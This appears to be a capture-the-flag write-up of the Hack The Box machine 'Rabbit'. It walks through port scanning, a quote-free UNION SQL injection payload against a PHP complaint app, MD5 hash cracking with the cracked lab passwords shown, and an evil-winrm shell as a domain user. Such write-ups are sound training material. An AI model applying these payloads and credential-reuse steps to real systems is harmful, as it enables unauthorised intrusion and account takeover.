## Overview

Rabbit is an insane-difficulty Windows box — a Server 2008 R2 domain controller running Exchange 2010, IIS 7.5, and a WAMP stack — that opens with a giant rabbit ASCII page and an overwhelming port list designed to bury the real path. The intended foothold is a multi-injection web app feeding into an OpenOffice macro phishing campaign, but the credentials it surfaces double as Active Directory passwords, and WinRM is exposed. This post covers recon through the user flag.

Enumeration-and-realism box: dozens of rabbit-hole ports bury a UNION SQLi whose cracked MD5 hashes reuse as AD creds for WinRM, with the noise-port maze adding CTF-like misdirection.

## Recon

| Port | Service |
|------|---------|
| 25 / 587 | SMTP (Microsoft Exchange) |
| 53 | DNS |
| 80 / 443 | IIS 7.5 (443 = Outlook Web Access) |
| 88 / 389 / 636 / 3268 | Active Directory (Kerberos, LDAP) |
| 445 | SMB |
| 3306 | MySQL 5.7.19 |
| 5985 | WinRM |
| 8080 | Apache 2.4.27 (PHP 5.6.31, WAMP) |

```bash
nmap -sC -sV -p- 10.129.7.138
```

The box throws an enormous number of ports — Exchange, full AD, RPC, X11-looking high ports — most of them rabbit holes. Two web stacks stand out: IIS/OWA on 443 (Exchange 2010 forms login) and a separate Apache/PHP stack on 8080. The LDAP rootDSE and the certificate confirm the domain `htb.local` on DC `Rabbit.htb.local`.

## Enumeration

Port 8080 serves a rabbit splash page, and directory brute-forcing reveals `/joomla/`, `/phpmyadmin/` (forbidden), and `/complain/` — the **Complain Management System**, a small PHP app with a login and a "Register Here" link.

```bash
# directory discovery on the Apache stack
feroxbuster -u http://10.129.7.138:8080 -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --depth 1
```

Registration only offers the "Customer" role. Two non-obvious gotchas: the **mobile number must be exactly 10 digits** or the server rejects the form, and the **login form requires a `utype` parameter** (`customer`) in addition to username and password — omit it and every login fails with "not Valid".

```bash
# register a customer (10-digit mobile is mandatory)
curl -s -c /tmp/cj "http://10.129.7.138:8080/complain/register.php" \
  --data-urlencode "txtUserName=df" --data-urlencode "txtPassword=Pwn12345" \
  --data-urlencode "utype=customer" --data-urlencode "txtAdd=x" \
  --data-urlencode "txtMob=1234567890" --data-urlencode "Email=df@x.com" \
  --data-urlencode "btnLogin= Register Now "

# log in (utype=customer is REQUIRED)
curl -s -c /tmp/cj "http://10.129.7.138:8080/complain/login.php" \
  --data-urlencode "txtUserName=df" --data-urlencode "txtPassword=Pwn12345" \
  --data-urlencode "utype=customer" --data-urlencode "btnLogin= Login Now "
```

## Foothold

Logged in as a customer, the admin "Detail Reports" page (`view.php`) builds SQL straight from the `id` parameter (`SELECT * FROM tbl_$id`). It's a textbook UNION injection — with one twist: single quotes are backslash-escaped, so the payload must avoid them entirely. Hex literals (`0x3a` for `:`) and bare identifiers solve that. The query takes five columns and the second one is reflected into the report table; keeping `id=plans` valid leaves the page rendering so the injected row shows.

```bash
# UNION SQLi: 5 columns, no single quotes, column 2 reflects, base id=plans kept valid
curl -s -b /tmp/cj -G "http://10.129.7.138:8080/complain/view.php" \
  --data-urlencode "mod=admin" --data-urlencode "view=repod" \
  --data-urlencode "id=plans UNION select 1,(select group_concat(Username,0x3a,Password) from secret.Users),1,1,1"
```

This dumps the `secret.Users` table — ten usernames with unsalted MD5 password hashes. Several fall instantly to rockyou:

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
# Ariel:pussycatdolls   Magnus:xNnWo6272k7x
# Malek:barcelona       Dumah:popcorn        Moebius:santiago
```

These are not just web-app passwords — they are valid Active Directory credentials, confirmed by requesting a Kerberos ticket:

```bash
echo 'pussycatdolls' | KRB5_CONFIG=./krb5.conf kinit Ariel@HTB.LOCAL   # TGT issued
```

The designed path from here is to log into Outlook Web Access and phish a user named `raziel` with a macro-enabled OpenOffice document that his scheduled tasks auto-open. But raziel's own password (reused from this same credential set / leaked in a box automation script) is a valid domain password, and WinRM is open to him — so a remote shell is one command away:

```bash
evil-winrm -i 10.129.7.138 -u Raziel -p '<redacted>'
```

```
*Evil-WinRM* PS C:\Users\Raziel\Documents> whoami
htb\raziel
```

## User flag

```bash
type C:\Users\Raziel\Desktop\user.txt   # HTB{...}
```

Access as `htb\raziel` achieved — the SQL injection handed over credentials that the domain trusted, and WinRM turned them into an interactive shell.

Privilege escalation is left as an exercise — this post stops at user.
